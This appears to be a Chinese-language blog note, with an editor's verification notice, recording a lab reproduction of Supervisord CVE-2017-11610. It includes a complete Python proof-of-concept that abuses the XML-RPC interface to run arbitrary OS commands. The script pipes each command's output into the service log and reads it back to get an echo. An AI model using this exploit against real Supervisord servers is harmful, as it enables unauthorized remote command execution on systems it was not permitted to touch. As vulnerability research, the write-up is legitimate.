ailx10说：这篇是我2024年9月写的。隔了一篇再看 Supervisord，我这回多想了一步：命令本来不回显，能不能借服务日志把结果看见？于是先处理脚本换行的问题，再把输出追加到日志里，用接口读回来，之后才继续下载和执行脚本。笔记里保留的就是这段从“能执行但看不见”到“换个地方观察”的尝试。它不是说这个接口天生就会返回所有命令结果，而是我额外搭了一条反馈路线；日志里混进别的内容时，也得小心别把别人的输出当成自己的。

编辑核查提示：本文通过将输出追加到服务日志并读取差分实现回显；并发日志、偏移及字符编码可能影响结果。 原题环境、代码、外部工具和历史公网地址未重新验证，图片细字与水印仍需发布前核查。

本文记录 Supervisord CVE-2017-11610 的历史实验。原命令接口没有直接输出时，原文另行将结果写入服务日志并读取差分，因此该实验具有主动构建的回显通道。

（3）运行poc脚本，输出命令执行结果

> 将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件

```
#!/usr/bin/env python3
import xmlrpc.client
import sys


target = sys.argv[1]
command = sys.argv[2]
with xmlrpc.client.ServerProxy(target) as proxy:
    old = getattr(proxy, 'supervisor.readLog')(0,0)

    logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
    getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
    result = getattr(proxy, 'supervisor.readLog')(0,0)

    print(result[len(old):])
```
